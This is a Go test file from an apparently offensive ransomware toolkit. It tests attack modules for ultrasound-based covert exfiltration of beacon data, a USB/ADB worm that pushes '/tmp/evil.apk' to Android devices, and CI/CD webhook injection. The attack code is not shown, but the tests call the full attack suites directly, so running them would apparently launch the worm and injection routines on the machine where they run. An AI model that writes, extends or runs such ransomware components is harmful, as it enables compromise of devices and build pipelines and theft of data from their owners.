package ransomware_test

// c2_channels_test.go — tests the hydra_vectors subpackage constructors.
//
// This file was misplaced in the root package (where NewUltrasoundQPSK etc. are
// not defined). Converted to an external test package that imports both the
// root package and hydra_vectors so the tests compile again.

import (
	"testing"

	ransomware "github.com/ruby570bocadito/x404x/internal/ransomware"
	hv "github.com/ruby570bocadito/x404x/internal/ransomware/hydra_vectors"
)

func TestNewUltrasoundQPSK(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUltrasoundQPSK(cfg)
	if u == nil {
		t.Fatal("NewUltrasoundQPSK() returned nil")
	}
}

func TestUltrasoundQPSKModulate(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUltrasoundQPSK(cfg)

	data := []byte("ULTRASOUND PAYLOAD DATA")
	modulated, err := u.QPSKModulate(data)
	if err != nil {
		t.Logf("QPSKModulate: %v (expected if no audio lib)", err)
	}
	if len(modulated) > 0 {
		t.Logf("Modulated data length: %d", len(modulated))
	}
}

func TestUltrasoundEncodePayload(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUltrasoundQPSK(cfg)

	payload := []byte("X404X beacon data")
	encoded := u.EncodePayload(payload)
	if len(encoded) == 0 {
		t.Error("EncodePayload returned empty")
	} else {
		t.Logf("Encoded payload: %d bytes", len(encoded))
	}
}

func TestUltrasoundSuite(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUltrasoundQPSK(cfg)

	result := u.FullUltrasoundSuite("exfil_data_here")
	if result == nil {
		t.Fatal("FullUltrasoundSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewUSBADBWorm(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUSBADBWorm(cfg)
	if u == nil {
		t.Fatal("NewUSBADBWorm() returned nil")
	}
}

func TestUSBADBFindADB(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUSBADBWorm(cfg)

	path, err := u.FindADB()
	if err != nil {
		t.Logf("FindADB: %v (expected if ADB not installed)", err)
	}
	if path != "" {
		t.Logf("ADB found at: %s", path)
	}
}

func TestUSBADBSuite(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	u := hv.NewUSBADBWorm(cfg)

	result := u.FullUSBADBSuite("/tmp/evil.apk")
	if result == nil {
		t.Fatal("FullUSBADBSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewCICDWebhookInject(t *testing.T) {
	cfg := ransomware.DefaultRansomwareConfig()
	c := hv.NewCICDWebhook(cfg)

	result := c.FullCICDSuite()
	if result == nil {
		t.Fatal("FullCICDSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}
